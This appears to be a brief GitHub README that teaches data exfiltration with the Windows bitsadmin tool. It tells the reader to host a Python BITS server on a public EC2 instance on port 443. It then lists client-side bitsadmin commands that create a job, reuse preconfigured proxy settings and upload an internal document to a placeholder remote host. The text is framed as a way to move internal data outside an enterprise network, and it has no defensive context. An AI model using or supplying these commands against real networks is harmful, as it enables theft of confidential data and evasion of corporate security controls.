# Awsome-Data-exfil
Data exfiltration with Bitsadmin.exe

############################################################################


Bitsadmin command to exfiltrate internal data outside the enterprise network

--------------------------------Server-side----------------------------------------------


First things first: Set up an EC2 instance or any server which is  publicly accessible on which python should be installed. Dowmload the python implementation of bitsadmin server.
Host the server on the EC2 instance with command like <python simplebitsServer.py 443>


--------------------------------Client-side----------------------------------------------

bitsadmin /create Job

bitsadmin /setproxysettings Job PRECONFIG

Bitsadmin /Transfer JOB /PRIORITY HIGH /UPLOAD hxxp://<remoteIP/URL>:<port> C:\User\<path to internal document to exfiltrate>
